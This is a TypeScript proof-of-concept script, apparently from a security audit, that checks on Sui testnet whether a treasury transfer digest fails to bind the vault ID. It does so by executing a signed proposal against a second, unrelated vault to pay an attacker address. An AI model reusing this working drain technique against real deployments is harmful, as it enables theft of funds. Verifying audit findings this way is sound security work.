/**
 * T01 X5: transfer_digest 未绑 vault_id 实弹验证 (WalkB 中危发现).
 *
 * Setup already live from .t01-live.mts run:
 *   org 0x3260… (A1 sole member w1, threshold_weight 1, key gen 1)
 *   treasury 0x695d… vault 0xcc0d… (funded 0.1 SUI, 0.04 already executed out)
 *   A1 sk persisted.
 *
 * Attack: create a SECOND independent vault (initialize_vault by A1 -> MasterCap
 * owned by A1, NOT sealed in any treasury), fund it 0.05 SUI. Then create a
 * treasury transfer proposal for amount 0.02 to ATTACKER, vote it, and sign the
 * V2 digest offline (nonce 2). Finally call asynchronous_proposal::
 * execute_transfer_proposal with the SECOND vault + its MasterCap. If the digest
 * truly omits vault_id, execution succeeds and vault_2 pays although no voter
 * ever saw vault_2. Note the treasury::execute path would reject (binding
 * checks), so we call asynchronous_proposal directly — which is public API.
 */
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { fromBase64 } from "@mysten/sui/utils"
import { SuiGrpcClient } from "@mysten/sui/grpc"
import { Transaction } from "@mysten/sui/transactions"
import { readFileSync, writeFileSync } from "node:fs"
import { homedir } from "node:os"
import { ed25519 } from "@noble/curves/ed25519.js"
import { sha256 } from "@noble/hashes/sha2.js"

const PKG = "0xcdc87b8ef5b071a293966f4329f1e9b4a443f49f1cf599cc188009cf7524ab44"
const SUI = "0x2::sui::SUI"
const A1 = "0x2c6539e5802d1476dae4a7aada30265dd2568f198ecf2f184861ea7deb3f6347"
const ATTACKER = "0x843f44a42e10a6dc701b7f60a4dedc544dc7910e971ee6a493f4d9096953e04e"
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006"
const CHAIN = Buffer.from("sui-testnet:")
const client = new SuiGrpcClient({ network: "testnet", baseUrl: "https://fullnode.testnet.sui.io:443" })

function keypairFor(address: string): Ed25519Keypair {
  const ks = JSON.parse(readFileSync(`${homedir()}/.sui/sui_config/sui.keystore`, "utf8")) as string[]
  for (const entry of ks) {
    const kp = Ed25519Keypair.fromSecretKey(fromBase64(entry).slice(1))
    if (kp.toSuiAddress() === address) return kp
  }
  throw new Error(`no keypair for ${address}`)
}
const le = (v: bigint): Uint8Array => { const o = new Uint8Array(8); let x = v; for (let i = 0; i < 8; i++) { o[i] = Number(x & 0xffn); x >>= 8n } return o }
const _vecB = (items: Uint8Array[]): Uint8Array => { const total = 1 + items.reduce((a, x) => a + x.length, 0); const o = new Uint8Array(total); o[0] = items.length; let p = 1; for (const x of items) { o.set(x, p); p += x.length } return o }
const addrB = (a: string) => Buffer.from(a.replace(/^0x/, "").padStart(64, "0"), "hex")
const idB = (a: string) => Buffer.from(a.replace(/^0x/, "").padStart(64, "0"), "hex")
// Read-field views of the gRPC response consumed below (the `events.events` /
// `digest.digest` fallbacks cover the legacy JSON-RPC result shapes the
// harness defensively reads).
type TxEvent = { eventType?: string; type?: string; json?: Record<string, unknown> | null; parsedJson?: Record<string, unknown> }
interface TxStatus { success?: boolean; error?: { message?: string } | null }
interface ObjectChangeView { type?: string; objectType?: string; created?: unknown; objectId?: string; object?: { objectType?: string; objectId?: string } }
interface TxEffectsView { objectChanges?: ObjectChangeView[]; _ObjectChange?: ObjectChangeView[]; changedObjects?: ObjectChangeView[] }
interface TxView { digest: string | { digest?: string }; status: TxStatus; events?: TxEvent[] | { events?: TxEvent[]; data?: TxEvent[] }; effects?: TxEffectsView }
const evType = (e: TxEvent) => String(e?.eventType ?? e?.type ?? "")
const evField = (e: TxEvent, f: string) => e?.json?.[f] as string ?? e?.parsedJson?.[f]

async function exec(signer: Ed25519Keypair, tx: Transaction, label: string) {
  tx.setSender(signer.toSuiAddress())
  const bytes = await tx.build({ client })
  const sig = await signer.signTransaction(bytes)
  const res: { Transaction?: TxView; FailedTransaction?: TxView } = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true } })
  const t0 = res.Transaction ?? res.FailedTransaction
  const rawEvs = t0?.events
  const evs = Array.isArray(rawEvs) ? rawEvs : (rawEvs?.events ?? rawEvs?.data ?? [])
  const t = { ...t0, events: evs }
  const ok = t?.status?.success === true
  const digest: string = typeof t?.digest === "string" ? t.digest : t?.digest?.digest as string
  console.log(`[${label}] ${ok ? "EXECUTED" : "ABORTED"} digest=${digest}${ok ? "" : " :: " + (t?.status?.error?.message ?? "").slice(0, 180)}`)
  return { ok, t, digest }
}

const st = JSON.parse(readFileSync("/tmp/t01-state.json", "utf8"))
const sk = new Uint8Array(Buffer.from(st.sk, "hex"))
const a1 = keypairFor(A1)
const _att = keypairFor(ATTACKER)
const orgId: string = st.orgId
const AMOUNT = 20_000_000n // 0.02 SUI

async function vaultBalance(id: string): Promise<string> {
  const { execSync } = await import("node:child_process")
  try {
    const o = JSON.parse(execSync(`sui client object ${id} --json`, { encoding: "utf8", maxBuffer: 8 << 20 }))
    // AgentVault<SUI> content: { id, balance, vault_version, ... } — balance shows as object with value? try fields
    const c = o.content?.fields ?? o.content
    return JSON.stringify(c?.balance ?? c?.["balance"] ?? "?")
  } catch { return "err" }
}

async function main() {
  // 1) second vault: initialize_vault (A1 gets MasterCap), fund 0.05 SUI
  console.log("=== X5 setup: independent vault #2 ===")
  let vault2 = st.vault2 ?? "", cap2 = st.cap2 ?? ""
  if (!vault2) {
    const tx = new Transaction()
    const [cap] = tx.moveCall({ target: `${PKG}::vault::initialize_vault`, typeArguments: [SUI], arguments: [] })
    tx.transferObjects([cap], A1)
    tx.setGasBudget(40_000_000)
    const r = await exec(a1, tx, "init vault2")
    if (!r.ok) throw new Error("vault2 init failed")
    for (const oc of r.t.effects?.objectChanges ?? (r.t.effects?._ObjectChange ?? r.t.effects?.changedObjects ?? [])) {
      const j = oc
      const _t = String(j.type ?? j.objectType ?? "")
      if (String(j.type) === "created" || j.created) {
        const ot = String(j.objectType ?? j.object?.objectType ?? "")
        if (ot.endsWith("vault::AgentVault")) vault2 = String(j.objectId ?? j.object?.objectId)
        if (ot.endsWith("vault::MasterCap")) cap2 = String(j.objectId ?? j.object?.objectId)
      }
    }
    console.log("vault2:", vault2, "cap2:", cap2)
    if (!vault2 || !cap2) throw new Error("vault2/cap2 ids missing — inspect effects")
    writeFileSync("/tmp/t01-state.json", JSON.stringify({ ...st, vault2, cap2 }, null, 1))
  } else console.log("reuse vault2", vault2)

  // fund vault2 0.05 SUI
  {
    const tx = new Transaction()
    const [c] = tx.splitCoins(tx.gas, [tx.pure.u64(50_000_000n)])
    tx.moveCall({ target: `${PKG}::vault::deposit`, typeArguments: [SUI], arguments: [tx.object(vault2), c] })
    tx.setGasBudget(30_000_000)
    await exec(a1, tx, "fund vault2 0.05 SUI")
  }
  console.log("vault2 balance before:", await vaultBalance(vault2))

  // 2) proposal via treasury (member A1), recipient ATTACKER, amount 0.02
  let proposalId = st.x5p ?? "", _bindingId = ""
  if (proposalId) console.log("reuse proposal", proposalId)
  if (!proposalId) {
    const deadline = BigInt(Date.now() + 3_600_000)
    const tx = new Transaction()
    tx.moveCall({
      target: `${PKG}::organization_treasury::create_transfer`,
      arguments: [
        tx.object(st.treasuryId), tx.object(orgId),
        tx.pure.vector("u8", Buffer.from("x5-vault-bind")), tx.pure.address(ATTACKER),
        tx.pure.u64(AMOUNT), tx.pure.u64(deadline), tx.object(CLOCK),
      ],
    })
    tx.setGasBudget(25_000_000)
    const r = await exec(a1, tx, "create_transfer x5")
    if (!r.ok) throw new Error("create failed")
    for (const e of r.t.events) if (evType(e).endsWith("TransferCreated")) { _bindingId = evField(e, "binding_id"); proposalId = evField(e, "proposal_id") }
    console.log("proposal:", proposalId)
    const st2 = JSON.parse(readFileSync("/tmp/t01-state.json", "utf8")); st2.x5p = proposalId
    writeFileSync("/tmp/t01-state.json", JSON.stringify(st2, null, 1))
  }
  // 3) vote (weight 1 = threshold) — only if not yet voted (fresh proposal id)
  const voted = st.x5voted === proposalId
  if (!voted) {
    await new Promise((r) => setTimeout(r, 4000)) // indexer catch-up for shared proposal
    const tx = new Transaction()
    tx.moveCall({
      target: `${PKG}::asynchronous_proposal::submit_async_vote`,
      arguments: [tx.object(proposalId), tx.object(orgId), tx.object(CLOCK), tx.pure.u64(1), tx.pure.vector("u8", new Uint8Array(64))],
    })
    tx.setGasBudget(20_000_000)
    await exec(a1, tx, "vote x5")
    const st2 = JSON.parse(readFileSync("/tmp/t01-state.json", "utf8")); st2.x5voted = proposalId
    writeFileSync("/tmp/t01-state.json", JSON.stringify(st2, null, 1))
  } else console.log("vote already recorded")
  // 4) sign digest offline. NOTE: last_nonce is 1 after the earlier X2 execute;
  //    read live value first.
  const { execSync } = await import("node:child_process")
  const orgObj = JSON.parse(execSync(`sui client object ${orgId} --json`, { encoding: "utf8", maxBuffer: 8 << 20 }))
  const orgFields = orgObj.content?.fields ?? {}
  const lastNonce = BigInt(orgFields.last_nonce ?? "1")
  const epoch = BigInt(orgFields.epoch_version ?? "1")
  const keyGen = BigInt(orgFields.key_generation ?? "1")
  const nonce = lastNonce + 1n
  console.log(`org live: last_nonce=${lastNonce} epoch=${epoch} key_generation=${keyGen} -> sign nonce=${nonce}`)
  const sig = ed25519.sign(sha256(Buffer.concat([
    Buffer.from("SUI_ORG_TREASURY_TRANSFER_V2:"), CHAIN,
    idB(orgId), le(epoch), le(nonce), idB(proposalId), addrB(ATTACKER), le(AMOUNT), le(keyGen),
  ])), sk)

  // 5) THE ATTACK: relay execute_transfer_proposal with vault2 + cap2 (NOT the
  //    treasury's sealed vault). Treasury binding objects are not involved.
  {
    const tx = new Transaction()
    tx.moveCall({
      target: `${PKG}::asynchronous_proposal::execute_transfer_proposal`,
      typeArguments: [SUI],
      arguments: [
        tx.object(proposalId), tx.object(orgId), tx.object(vault2), tx.object(cap2),
        tx.pure.u64(nonce), tx.pure.vector("u8", sig), tx.object(CLOCK),
      ],
    })
    tx.setGasBudget(30_000_000)
    const r = await exec(a1, tx, "ATTACK: execute on vault2 with treasury-signed digest")
    console.log(r.ok ? "  ❌ VULNERABLE: vault_id NOT bound — cross-vault drain executed" : "  ✅ blocked")
    for (const e of r.t.events) console.log("   ev:", evType(e).split("::").slice(1).join("::"), JSON.stringify(e.json).slice(0, 150))
    console.log("vault2 balance after:", await vaultBalance(vault2))
  }
}

main().catch((e) => { console.error("FATAL", e); process.exit(1) })
